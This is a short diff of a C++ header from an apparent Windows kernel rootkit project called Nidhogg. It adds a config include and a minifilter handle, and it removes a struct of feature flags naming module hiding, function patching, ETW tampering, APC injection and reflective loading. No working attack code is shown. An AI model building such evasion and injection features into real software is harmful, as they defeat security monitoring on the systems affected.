@@ -1,5 +1,6 @@
 #pragma once
 #include "pch.h"
+#include "NidhoggConfig.h"
 #include "Logger.h"
 
 // #define DRIVER_REFLECTIVELY_LOADED // Comment or uncomment it when you load the driver reflectively.
@@ -9,25 +10,9 @@ inline constexpr Logger NidhoggLogger;
 
 // Globals.
 inline PVOID RegistrationHandle = NULL;
+inline PFLT_FILTER NidhoggFilter = nullptr;
 
 extern "C" {
     extern ULONG WindowsBuildNumber;
     extern decltype(ExAllocatePool2)* AllocatePool2;
 }
-
-struct EnabledFeatures {
-	bool DriverReflectivelyLoaded = false;
-	bool FunctionPatching = true;
-	bool ModuleHiding = true;
-	bool WriteData = true;
-	bool ReadData = true;
-	bool RegistryFeatures = true;
-	bool ProcessProtection = true;
-	bool ThreadProtection = true;
-	bool FileProtection = true;
-	bool EtwTiTamper = true;
-	bool ApcInjection = true;
-	bool AutoModuleUnload = true;
-	bool NofExecution = true;
-};
-inline EnabledFeatures Features;
